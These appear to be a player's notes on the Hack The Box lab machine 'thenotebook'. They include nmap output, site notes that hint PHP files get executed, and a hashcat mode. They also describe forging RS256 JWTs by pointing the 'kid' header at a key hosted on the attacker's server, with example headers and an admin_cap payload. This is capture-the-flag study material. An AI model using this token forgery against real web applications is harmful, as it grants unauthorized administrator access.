# thenotebook

- ip: 10.10.10.230
- os: `Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`

## nmap
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## rxapi

## web
- JWT token manipulation via `kid` (key id)
  - host a private key on our own server
  - sign a RS256 token with our key
- username/password/email = `a/a/a@a.com`

```
{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}
{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.5:9000/jwtrs256.key"}

{"username":"a","email":"a@a.com","admin_cap":true}
```

### "is my data safe? - noah
```
noah
I wonder is the admin good enough to trust my data with?
```

### "The Notebook Quotes" - noah
```
"I am nothing special, of this I am sure. I am a common man with common thoughts and I've led a common life. There are no monuments dedicated to me and my name will soon be forgotten, but I've loved another with all my heart and soul, and to me, this has always been enough.." ― Nicholas Sparks, The Notebook

"So it's not gonna be easy. It's going to be really hard; we're gonna have to work at this everyday, but I want to do that because I want you. I want all of you, forever, everyday. You and me... everyday." ― Nicholas Sparks, The Notebook "You can't live your life for other people. You've got to do what's right for you, even if it hurts some people you love." ― Nicholas Sparks, The Notebook "You are, and always have been, my dream." ― Nicholas Sparks, The Notebook "You are my best friend as well as my lover, and I do not know which side of you I enjoy the most. I treasure each side, just as I have treasured our life together." ― Nicholas Sparks, The Notebook "I love you. I am who I am because of you. You are every reason, every hope, and every dream I've ever had, and no matter what happens to us in the future, everyday we are together is the greatest day of my life. I will always be yours. " ― Nicholas Sparks, The Notebook "We fell in love, despite our differences, and once we did, something rare and beautiful was created. For me, love like that has only happened once, and that's why every minute we spent together has been seared in my memory. I'll never forget a single moment of it." ― Nicholas Sparks, The Notebook
```

### "Backups are scheduled" - admin
```
Finally! Regular backups are necessary. Thank god it's all easy on server.
```

### "Need to fix config" - admin
```
Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server.
```

## hashcat
- **sha3-256**. hashcat (17400)

